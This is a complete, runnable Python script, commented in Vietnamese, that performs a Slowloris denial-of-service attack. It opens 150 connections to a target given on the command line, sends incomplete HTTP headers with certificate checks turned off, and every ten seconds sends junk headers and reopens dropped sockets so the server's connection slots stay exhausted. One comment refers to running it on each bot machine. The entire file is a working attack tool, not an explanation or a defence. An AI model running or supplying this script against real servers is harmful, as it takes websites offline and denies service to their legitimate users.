import socket
import ssl
import random
import time
import sys

# 1. LẤY IP VÀ LÀM SẠCH URL (Tự động gọt bỏ http:// và https://)
raw_target = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.10:8000"
parsed = raw_target.replace("http://", "").replace("https://", "")
parsed = parsed.split("/")[0]

if ":" in parsed:
    target_ip, port_str = parsed.rsplit(":", 1)
    try:
        target_port = int(port_str)
    except ValueError:
        target_port = 443 if raw_target.startswith("https://") else 80
else:
    target_ip = parsed
    target_port = 443 if raw_target.startswith("https://") else 80

num_sockets = 150 # Số lượng kết nối ngâm trên mỗi máy bot

print(f"[*] Bắt đầu Slowloris ngâm {num_sockets} kết nối vào {target_ip}:{target_port}...")
sockets = []

def create_socket():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        
        # Chỉ bọc SSL nếu mục tiêu là cổng 443 (HTTPS)
        if target_port == 443:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=target_ip)
            
        sock.connect((target_ip, target_port))
        
        # Gửi nửa vời Header
        sock.send(b"GET / HTTP/1.1\r\n")
        sock.send(f"Host: {target_ip}\r\n".encode("utf-8"))
        sock.send(b"User-Agent: Mozilla/5.0 (Windows NT 10.0)\r\n")
        return sock
    except Exception as e:
        # Trả về chuỗi lỗi thay vì None để dễ in ra log
        return f"Lỗi: {str(e)}"

# Khởi tạo đợt socket đầu tiên
print("[*] Đang thiết lập các kết nối ban đầu. Vui lòng chờ...")
for i in range(num_sockets):
    result = create_socket()
    # Kiểm tra xem result trả về có phải là object socket không (thành công) hay là chuỗi (bị lỗi)
    if hasattr(result, 'send'):
        sockets.append(result)
    else:
        # Nếu chỉ muốn test, có thể bỏ comment dòng dưới để thấy chi tiết từng lỗi
        # print(f"[DEBUG] Kết nối {i+1} thất bại: {result}")
        pass

print(f"[*] Đã thiết lập thành công {len(sockets)}/{num_sockets} kết nối. Bắt đầu câu giờ...")

try:
    loop_count = 0
    while True:
        loop_count += 1
        dropped = 0
        
        # Cứ 10 giây gửi 1 byte rác để giữ kết nối không bị timeout
        for s in list(sockets):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            except Exception:
                sockets.remove(s)
                dropped += 1
        
        # Nếu socket nào bị đứt, tạo lại ngay lập tức để bù đắp
        reconnected = 0
        for _ in range(num_sockets - len(sockets)):
            result = create_socket()
            if hasattr(result, 'send'):
                sockets.append(result)
                reconnected += 1
                
        # IN LOG KIỂM SOÁT TÌNH HÌNH
        print(f"[DEBUG - Vòng {loop_count}] Đang duy trì: {len(sockets)} kết nối | Bị đứt: {dropped} | Khôi phục: {reconnected}")
            
        time.sleep(10)
        
except KeyboardInterrupt:
    print(f"\n[*] Đã dừng Slowloris. Đang dọn dẹp {len(sockets)} kết nối...")
    for s in sockets:
        try:
            s.close()
        except:
            pass